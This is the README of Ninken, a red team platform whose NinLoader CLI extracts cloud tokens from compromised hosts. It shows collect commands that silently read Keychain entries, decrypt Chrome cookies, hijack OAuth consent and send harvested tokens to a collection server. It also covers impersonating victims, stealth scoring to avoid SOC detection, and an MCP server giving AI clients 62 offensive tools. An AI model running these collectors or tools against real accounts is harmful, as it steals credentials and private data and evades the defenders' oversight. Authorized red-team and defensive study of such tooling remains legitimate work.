<p align="center">
  <img src="images/ninken-banner.png" alt="Ninken Banner" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/version-0.5.0-dc2626?style=flat-square&labelColor=1a1a1a" alt="Version">
  <img src="https://img.shields.io/badge/license-MIT-dc2626?style=flat-square&labelColor=1a1a1a" alt="License">
  <img src="https://img.shields.io/badge/Next.js-16-e6e6e6?style=flat-square&labelColor=1a1a1a" alt="Next.js">
  <img src="https://img.shields.io/badge/TypeScript-5-e6e6e6?style=flat-square&labelColor=1a1a1a" alt="TypeScript">
  <img src="https://img.shields.io/badge/Python-3.9+-e6e6e6?style=flat-square&labelColor=1a1a1a" alt="Python">
</p>

<p align="center">
  <b>Red Team Cloud Operations Platform</b><br>
  <i>Track. Hunt. Retrieve.</i>
</p>

---

## What is Ninken?

Ninken (忍犬 — ninja dog) is a local-first red team platform for operating, auditing, and collecting across cloud services. Extract credentials from compromised hosts, import them into Ninken, and get instant access to email, files, calendars, directories, and security configurations — all from your browser.

## Audit & Impersonate

Drop a stolen token and instantly see the world through the victim's eyes:

- **Permission enumeration** — map every user, group, role, app, delegation, and policy the token can reach
- **Operate as the user** — read their email, browse their files, view their calendar, list their repos — all read-only, all through the API
- **FOCI token pivoting** — exchange a Microsoft refresh token across Teams, Office, Outlook, OneDrive to discover hidden scopes
- **Resource probing** — test if the credential can reach Azure Resource Manager, Key Vault, Storage, DevOps
- **Cross-tenant discovery** — enumerate federated tenants and trust relationships
- **Privilege escalation paths** — AWS IAM privesc analysis, per-provider risk dashboards with scored attack paths
- **Conditional Access bypass analysis** — full scoring engine that identifies CA policy gaps, exclusion abuse, legacy protocol bypasses, trusted location pivots, and report-only mode exploitation
- **Adversarial graphs** — multi-provider operator graph showing all compromised accounts and their service access, attack path visualization, and cross-provider entity mapping

## Secret Scanning & Intelligence Queries

Hunt for credentials, API keys, and sensitive data across every service:

- **41 detection patterns** — regex-based scanning for AWS keys, GCP service accounts, Azure secrets, private keys, .env files, database connection strings, bearer tokens, SSH keys, webhooks, and more
- **38 pre-built intelligence queries** — passwords in email/drive, financial data, VPN configs, infrastructure diagrams, onboarding docs, security reports — each with severity rating and red team context
- **Multi-service search** — one query searches Gmail + Drive + OneDrive + Outlook simultaneously
- **Custom patterns** — define and save your own detection patterns with IndexedDB persistence
- **Category filters** — Cloud Keys, Tokens, Private Keys, Credentials, Connection Strings, PII, Webhooks
- **AI extraction** — toggle AI extraction to parse raw text matches into clean secret values

Available under **Audit → Hunt** for each provider.

## NinLoader — Token Extraction CLI

NinLoader is a cross-platform credential collector that discovers and extracts cloud service tokens from compromised hosts. It ships as **Go** (single static binary), **Python**, and **PowerShell** — zero external dependencies for core features.

### Quick Start

```bash
# Go binary (recommended — single file, no runtime dependencies)
./ninloader discover                 # Scan for token sources
./ninloader collect                  # Extract all available tokens

# Python (if no Go binary available)
cd ninloader/python
python3 ninloader.py discover
python3 ninloader.py collect
```

### Discover token sources

```bash
$ ninloader discover

Service      Source               Stealth  Account                        Path
----------------------------------------------------------------------------------------------------
github       gh_cli               5        jdoe@github.com                ~/.config/gh/hosts.yml (token in keychain)
google       adc                  5        892451037612-k9m2p8r...        ~/.config/gcloud/application_default_credentials.json
google       gcloud               5        admin@acme-corp.io             ~/.config/gcloud/credentials.db
google       gws_cli              3        client_id=441738160552-...     ~/.config/gws/client_secret.json (GWS Workspace scopes)
microsoft    foci_device_code     3                                        (FOCI device code — one token for Teams/Office/Outlook/OneDrive)
microsoft    browser_hijack       4        active Chrome session          Chrome profile copy + CDP auto-click OAuth
slack        browser_cookies      5        chrome:Default                 Chrome cookies (d_cookie, Win/Linux)
aws          credentials          5                                        ~/.aws/credentials
```

### Collect tokens

```bash
# Collect all Google tokens (file-based, stealth 5)
$ ninloader collect --service google
Collected 2 token(s).

# Collect GitHub PAT from macOS Keychain (silent, no prompt)
$ ninloader collect --service github --source gh_cli
Collected 1 token(s).
[{"token":{"platform":"github","access_token":"gho_xK9mP2vL..."}}]

# Microsoft FOCI — one token pivots across Teams/Office/Outlook/OneDrive
$ ninloader collect --service microsoft --source foci_device_code
  Visit:  https://login.microsoft.com/device
  Code:   ET55R7XTE

# GWS OAuth hijack — steal Workspace access using gws-cli credentials
$ ninloader collect --service google --source gws_cli
[INFO] Opening browser for OAuth consent...
[INFO] Auth code captured! Exchanging for tokens...
[INFO] SUCCESS — GWS token for admin@acme-corp.io

# Save to file (0o600 permissions)
$ ninloader collect --output file --path ./tokens

# Send directly to Ninken
$ ninloader collect --output ninken --ninken-url http://localhost:4000
Sent github/gh_cli [200]
  → Open in browser: http://localhost:4000/?import=891fb8e6677a
```

### Supported Collectors

| Service | Source | Platforms | Stealth | Notes |
|---------|--------|-----------|---------|-------|
| Google | `adc` | All | 5 | Application Default Credentials |
| Google | `gcloud` | All | 5 | gcloud SQLite credentials.db (GCP scopes only) |
| Google | `gws_cli` | All | 3 | OAuth via stolen client_secret.json (Workspace scopes) |
| Google | `browser_cookies` | Win/Linux | 5 | Chrome cookie decrypt (session hijack) |
| Google | `browser_hijack` | All | 4 | Chrome profile + CDP (experimental) |
| GitHub | `gh_cli` | All | 5 | Keychain (macOS), Credential Manager (Win), YAML/pass (Linux) |
| GitHub | `git_credentials` | All | 5 | ~/.git-credentials |
| Microsoft | `foci_device_code` | All | 3 | FOCI device code — zero deps, one token for all M365 apps |
| Microsoft | `browser_hijack` | All | 4 | Chrome profile + CDP auto-click OAuth |
| Microsoft | `browser_cookies` | Win/Linux | 5 | Chrome cookie decrypt (session hijack) |
| Microsoft | `teams_desktop` | All | 5 | Teams LevelDB cache |
| Slack | `desktop` | All | 5 | Slack LevelDB xoxc tokens |
| Slack | `browser_cookies` | Win/Linux | 5 | Chrome d_cookie decrypt |
| Slack | `combined` | All | 5 | xoxc + d_cookie correlation |
| AWS | `credentials` | All | 5 | ~/.aws/credentials |
| AWS | `env` | All | 5 | Environment variables |
| AWS | `sso_cache` | All | 5 | AWS SSO cache |
| GitLab | `pat` | All | 5 | glab config, env, Keychain, .netrc |
| Chrome | `cdp_cookies` | All | 4 | CDP Network.getAllCookies — universal decrypt bypass |

### OPSEC Notes

| Operation | macOS | Windows | Linux |
|-----------|-------|---------|-------|
| File reads (ADC, gcloud, gh YAML, AWS) | Silent | Silent | Silent |
| GitHub Keychain (gh:github.com) | **Silent** | Silent | Silent |
| Chrome cookie decrypt | **PROMPT** | Silent (DPAPI) | Silent (peanuts) |
| GWS OAuth browser tab | Tab flash | Tab flash | Tab flash |
| FOCI device code | Silent (network) | Silent (network) | Silent (network) |

## Supported Services

| Provider | Operate | Audit | Collect | Status |
|----------|---------|-------|---------|--------|
| Google Workspace | Gmail, Drive, Calendar, Chat, Buckets, Directory | Users, Groups, Roles, Apps, Delegation, Policies, Devices, Marketplace, Access Policies, Contacts, Admin Reports, Alert Center, Drive Activity, Hunt, Risk Dashboard | Email, files, attachments | Active |
| Microsoft 365 | Outlook, OneDrive, Teams, Entra ID, SharePoint | Users, Groups, Roles, Apps, Service Principals, Sign-ins, CA Policies, CA Bypass Analysis, Risky Users, Cross-Tenant, Auth Methods, FOCI Pivot, Resource Pivot, Hunt, Risk Dashboard | Email, files | Active |
| GitHub | Repos, Orgs, Gists, Actions | Members, Branch Protections, Webhooks, Deploy Keys, Secrets, Actions Security, Repo Access, Apps, Hunt, Risk Dashboard | Repo data | Active |
| GitLab | Projects, Groups, Pipelines, Snippets | Members, Deploy Tokens, Runners, Variables, Webhooks, Hunt, Risk Dashboard | Project data | Active |
| Slack | Channels, Users, Files | — | Messages, files | Active |
| AWS | IAM, EC2, S3, Lambda, CloudTrail, Secrets Manager | IAM Policies, Access Keys, Privesc, Cross-Account, Public S3, Lambda URLs, CloudTrail Gaps, Security Groups, Secrets Rotation | — | Active |
| GCP | Firestore, RTDB, Storage, Compute, Vertex AI | Public Buckets, Firewall Rules, API Keys, Risk Dashboard, Hunt | — | Active |

## OPSEC Guidance

Every action in Ninken is annotated with detection risk:

- **Stealth Calculator** — toggle operation characteristics (Read / Write / Delete / Admin API / Bulk / Sensitive Data) and get an estimated detection level: Ghost (<5%) → Silent (5-15%) → Cautious (15-40%) → Loud (40-75%) → Burned (>75%)
- **Per-operation risk** — each API call mapped to a detection tier with guidance on rate-limiting, timing, and log footprint
- **SOC visibility warnings** — pages that generate audit log entries show explicit banners
- **Token OPSEC scores** — browser session tokens (low OPSEC) vs API tokens (high OPSEC)
- **NinLoader Collection OPSEC** — Keychain prompt matrix, platform-specific detection surface, stealth scores per collector

Available under **OPSEC** mode and **Studio → Collection**.

## Vault — Credential Inventory

Hunt for secrets, extract them with AI, and reinject discovered credentials back into Ninken:

- **AI Extraction** — Toggle AI extraction on Hunt pages; the configured LLM parses raw text matches to extract clean secret values (keys, tokens, passwords)
- **Credential inventory** — Encrypted IndexedDB store with type, source, confidence, and discovery metadata
- **Reinject** — Import discovered credentials (AWS keys, GitHub PATs, Microsoft refresh tokens) directly into Ninken as new provider sessions
- **Targeted Search** — Take a vault item and search across all providers to find every occurrence
- **Content masking** — Secret values hidden by default, revealed on demand with auto-clear clipboard

Available under the **Vault** icon in the sidebar.

## MCP Server — 62 Red Team Tools

Ninken ships a full MCP (Model Context Protocol) server that exposes 62 tools across all providers. Any MCP client (Claude Desktop, Claude Code, or custom) can operate Ninken programmatically.

- **Dual transport** — STDIO (auto-started by Claude) or Streamable HTTP (user-controlled, configurable bind address and port)
- **Credential injection** — `load_credential_file` loads tokens directly from disk; `load_credential` accepts inline JSON. Injected credentials appear in both the MCP session and the Ninken UI
- **Dynamic provider switching** — `switch_profile` pivots between providers mid-session; `load_credential_file` auto-activates the injected token
- **Tier 1 — Core & Browse** — Gmail search, Drive browse, Calendar events, Outlook search, OneDrive files, Entra ID enumeration, GitHub repos/orgs/gists, GitLab projects/groups/snippets, Slack channels/users/files, AWS IAM/S3, GCP buckets
- **Tier 2 — Deep Enumeration** — GWS audit (users/groups/admin reports), Microsoft audit (sign-ins, CA policies, service principals), GitHub secrets/webhooks/org members, AWS IAM roles/Secrets Manager
- **Tier 3 — Offensive Primitives** — FOCI token pivot, Azure resource pivot, AWS STS assume-role, Secrets Manager value retrieval, Vault AI secret extraction
- **Tier 4 — Data Access** — Teams messages, SharePoint sites, S3 object browsing, S3 bucket policies, EC2 instances, security groups, Google Chat spaces, Slack messages, GCP firewall rules, GCP API key audit

### Quick Start (STDIO)

```bash
cd mcp-server && npm install
# Add to .mcp.json — Claude Desktop/Code auto-starts the server
```

### Quick Start (HTTP)

```bash
# From the Ninken Settings UI: MCP Server → HTTP → Start Server
# Or via API:
curl -X POST http://localhost:4000/api/mcp/start \
  -H "Content-Type: application/json" \
  -d '{"transport":"http","port":3001,"host":"127.0.0.1"}'
```

Available under **Settings → MCP Server** tab.

## Settings — AI Configuration

Configure AI providers from the UI — no config files needed:

- **Multi-vendor LLM** — Anthropic (Claude), OpenAI (GPT), Google Gemini, Ollama (local models)
- **API keys in DB** — Encrypted IndexedDB storage, not .env files
- **Test connection** — Verify API key and endpoint before saving

Available under **Settings** (gear icon in the header).

## Modes

- **Operate** — Browse and interact with cloud service data (read-only)
- **Explore** — Enumerate permissions, configurations, and security posture. Includes adversarial graphs (operator view, attack paths, cross-provider entity mapping) and per-provider risk dashboards
- **Collect** — Queue and download evidence (email, files, attachments) with JSZip bundling
- **Studio** — Token analyzer, FOCI converter, scope calculator, MSAL extractor, service map, extraction techniques database, collection reference, API explorer (raw API proxy with request builder), offline DB export (JSON/CSV snapshots)
- **OPSEC** — Stealth calculator and 56-operation detection risk catalog across all providers

## Install

### Docker (recommended)

```bash
git clone https://github.com/iamveene/ninken.git
cd ninken
./install.sh
```

The installer detects Docker, generates `.env`, builds and starts the container:

```
[ninken] Docker 27.x.x detected
[ninken] Docker Compose v2.x.x detected
[ninken] .env created with auto-generated NINKEN_COOKIE_SECRET
[ninken] Building Ninken container...
[ninken] Starting Ninken...
[ninken] Ninken is healthy!
════════════════════════════════════════════════════
  Ninken is running at http://localhost:4000
════════════════════════════════════════════════════
```

Options: `./install.sh --port 8080 --anthropic-key sk-... --model claude-sonnet-4-20250514`

### Direct (development)

```bash
git clone https://github.com/iamveene/ninken.git
cd ninken
npm install
npm run dev
# Open http://localhost:4000
```

## Architecture

```
src/
├── app/
│   ├── (google)/          # Google Workspace (23 pages)
│   ├── (microsoft)/       # Microsoft 365 (24 pages)
│   ├── (github)/          # GitHub (18 pages)
│   ├── (gitlab)/          # GitLab (15 pages)
│   ├── (slack)/           # Slack (4 pages)
│   ├── (aws)/             # AWS (18 pages)
│   ├── (gcp)/             # GCP (11 pages)
│   ├── (explore)/         # Adversarial graphs, attack paths
│   ├── (studio)/          # Studio tools (7 pages)
│   ├── (vault)/           # Vault — credential inventory
│   ├── alerts/            # Alert management
│   ├── collection/        # Evidence collection queue
│   ├── settings/          # Settings page (AI, MCP, About)
│   ├── api/               # 195+ API routes
│   └── page.tsx           # Landing / credential import
├── components/            # UI components
├── hooks/                 # React hooks
└── lib/
    ├── providers/         # Service provider abstractions (7 providers)
    ├── audit/             # Risk scoring, attack path builders, CA bypass analysis
    ├── llm/               # Multi-vendor LLM adapters (Anthropic, OpenAI, Gemini, Ollama)
    ├── graph/             # Adversarial graph types and layout
    ├── vault-store.ts     # Encrypted Vault IndexedDB
    ├── settings-store.ts  # Settings IndexedDB
    ├── token-store.ts     # Encrypted credential storage
    └── session-store.ts   # Server-side credential sessions

mcp-server/
├── index.js               # MCP server (STDIO + Streamable HTTP, 62 tools)
├── tools.js               # Tool definitions grouped by provider (Zod schemas)
└── package.json           # Standalone dependencies (@modelcontextprotocol/sdk)

ninloader/
├── go/                    # Go binary (recommended — single static file, 10MB)
│   ├── main.go            # Entry point
│   ├── cmd/               # CLI layer (cobra: discover, collect, validate, refresh)
│   ├── collectors/        # 21 collectors across 7 services
│   │   ├── aws/           # credentials, env, sso_cache
│   │   ├── google/        # adc, gcloud, gws_cli, browser_cookies, http_oauth
│   │   ├── github/        # gh_cli, git_credentials
│   │   ├── microsoft/     # foci_device_code, browser_hijack, browser_cookies, teams_desktop
│   │   ├── slack/         # desktop, browser_cookies, combined
│   │   ├── gitlab/        # pat (glab config, env, Keychain, .netrc)
│   │   └── chrome/        # cdp_cookies (universal decrypt bypass)
│   ├── internal/          # Core: types, registry, CDP, chromium decrypt, platform
│   └── Makefile           # Cross-compile: darwin/linux/windows × amd64/arm64
├── python/
│   ├── ninloader.py       # Python CLI entry point
│   ├── pyproject.toml     # Package metadata
│   └── ninloader/
│       ├── collectors/    # 17 service-specific extractors
│       │   ├── aws/       # credentials, env, sso_cache
│       │   ├── google/    # adc, gcloud, gws_cli, browser_hijack, browser_cookies
│       │   ├── github/    # gh_cli, git_credentials
│       │   ├── microsoft/ # foci_device_code, browser_hijack, browser_cookies, teams_desktop
│       │   └── slack/     # desktop, browser_cookies
│       └── core/
│           ├── cdp.py     # Chrome DevTools Protocol client
│           ├── chromium_decrypt.py  # Cross-platform cookie decryption
│           ├── output.py  # stdout/file/clipboard/ninken handlers
│           └── validator.py  # Token validation
└── powershell/
    └── NinLoader.ps1      # PowerShell version (Windows)
```

## Adding a Provider

1. Implement the `ServiceProvider` interface in `src/lib/providers/`
2. Register it in `src/lib/providers/index.ts`
3. Add helper function in `src/app/api/_helpers.ts`
4. Create route group under `src/app/(provider-name)/`

## Usage

<p align="center">
  <img src="images/ninken-walkthrough.gif" alt="Ninken Walkthrough" width="100%">
</p>

1. **Import credentials** — drag-and-drop, paste JSON, or use NinLoader CLI to extract tokens from a compromised host
2. **Operate** — browse email, files, calendars, repos, and channels as the target user
3. **Hunt** — scan across all services for exposed credentials using 41 detection patterns, plus run 38 pre-built intelligence queries
4. **Audit** — enumerate users, groups, roles, permissions, delegations, and security configurations
5. **Risk Assessment** — per-provider risk dashboards with scored attack paths, CA bypass analysis, and adversarial graphs
6. **OPSEC** — assess detection risk before executing with the stealth calculator and 56-operation catalog
7. **Collect** — queue and download evidence (emails, attachments, files) for offline analysis
8. **AI Partner** — ask natural language questions about the target environment with Live/Collection search modes
9. **Studio** — analyze tokens, calculate scopes, convert FOCI tokens, explore APIs, export offline snapshots

## Security

Ninken is a red team tool designed for authorized security testing and research. Credentials are stored locally in encrypted IndexedDB and are never transmitted to external servers. All API calls are made directly from the Ninken server to the target service.

---

<p align="center">
  <img src="images/ninken-badge.png" alt="Ninken" width="48">
</p>
